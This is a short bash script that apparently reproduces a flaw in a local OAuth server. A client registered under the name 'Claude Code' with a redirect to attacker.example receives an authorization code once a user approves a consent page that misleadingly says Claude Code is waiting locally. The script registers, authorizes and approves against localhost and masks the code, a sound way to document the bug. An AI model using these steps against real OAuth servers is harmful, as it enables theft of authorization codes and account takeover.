#!/bin/bash
# Repro: a client registered with an https redirect on another site gets a code for whoever presses Connect,
# while the consent page says "Claude Code is waiting on this computer".
B=${BASE:-http://localhost:8098}
C=$(mktemp)
curl -s --noproxy '*' -c $C -H 'Content-Type: application/json' -d '{"username":"jonas","password":"demo-password-123"}' $B/api/auth/login > /tmp/qa-ui/login.json
CSRF=$(python3 -c "import json;print(json.load(open('/tmp/qa-ui/login.json'))['csrf'])")
CID=$(curl -s --noproxy '*' -H 'Content-Type: application/json' -d '{"client_name":"Claude Code","redirect_uris":["https://attacker.example/cb"]}' $B/oauth/register | python3 -c "import sys,json;print(json.load(sys.stdin)['client_id'])")
echo "client $CID"
curl -s --noproxy '*' -b $C -o /dev/null -w 'authorize -> %{http_code} %{redirect_url}\n' "$B/oauth/authorize?client_id=$CID&redirect_uri=https%3A%2F%2Fattacker.example%2Fcb&response_type=code&state=s&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256" | cut -c1-140
curl -s --noproxy '*' -b $C -o /dev/null -w 'approve -> %{http_code} %{redirect_url}\n' -d "client_id=$CID&redirect_uri=https://attacker.example/cb&state=s&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256&response_type=code&decision=allow&csrf=$CSRF&device_name=x" $B/oauth/approve | sed 's/code=[^&]*/code=<CODE>/'
